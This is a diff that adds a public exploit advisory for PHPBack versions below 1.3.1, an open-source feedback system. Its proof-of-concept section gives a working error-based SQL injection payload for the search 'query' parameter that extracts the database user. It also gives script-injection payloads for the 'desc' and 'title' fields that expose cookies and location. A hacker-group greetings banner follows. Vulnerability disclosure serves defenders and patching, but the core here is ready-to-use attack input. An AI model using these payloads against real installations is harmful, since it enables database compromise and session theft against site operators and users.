@@ -1,0 +1,57 @@
+##################################################################################################
+#Exploit Title :PHPback  < version 1.3.1 SQL Injection and XSS vulnerability 
+#Author        : Manish Kishan Tanwar AKA error1046 (https://twitter.com/IndiShell1046)
+#Date          : 27/01/2017
+#Love to       : zero cool,Team indishell,Mannu,Viki,Hardeep Singh,Jagriti,Kishan Singh and ritu rathi
+#Tested At  : Indishell Lab
+##################################################################################################
+ 
+////////////////////////
+/// Overview:
+////////////////////////
+ 
+PHPBack is an open source feedback system and developed on codeigniter framework. There is SQL Injection in search parameter "query" and XSS issue in desc as well as title ppost parameter
+  
+ 
+////////////////
+///  POC   ////
+///////////////
+
+SQL Injection payload to enumerate tables
+----------------------------------------------
+http://127.0.0.1/phpback-master/home/search
+Post data
+query=')%0Aor%0Aextractvalue(6678,concat(0x7e,(select%0Auser()),0x7e))--%0A%23
+
+
+XSS 
+----
+http://127.0.0.1/phpback-master/home/postidea
+Post data
+
+in desc parameter
+desc=</textarea><script>alert(document.cookie);</script>
+in title parameter
+
+title="><script>alert(document.location);</script>
+
+
+SQLI Screenshot 
+https://cloud.githubusercontent.com/assets/10351062/14776703/c9440524-0ae5-11e6-9240-a37a685a72b1.png
+
+XSS screenshot
+https://cloud.githubusercontent.com/assets/10351062/14811513/14fbebdc-0bb6-11e6-8ea5-229e2ab71eb8.png
+ 
+ 
+                             --==[[ Greetz To ]]==--
+############################################################################################
+#Guru ji zero ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indishell,Baba,
+#Silent poison India,Magnum sniper,ethicalnoob Indishell,Reborn India,L0rd Crus4d3r,cool toad,
+#Hackuin,Alicks,mike waals,cyber gladiator,Cyber Ace,Golden boy INDIA,d3, rafay baloch, nag256
+#Ketan Singh,AR AR,saad abbasi,Minhal Mehdi ,Raj bhai ji ,Hacking queen,lovetherisk,Bikash Dash
+#############################################################################################
+                             --==[[Love to]]==--
+# My Father ,my Ex Teacher,cold fire hacker,Mannu, ViKi ,Ashu bhai ji,Soldier Of God, Bhuppi,
+#Mohit,Ffe,Ashish,Shardhanand,Budhaoo,Jagriti,Salty, Hacker fantastic, Jennifer Arcuri and Don(Deepika kaushik)
+                       --==[[ Special Fuck goes to ]]==--
+                            <3  suriya Cyber Tyson <3
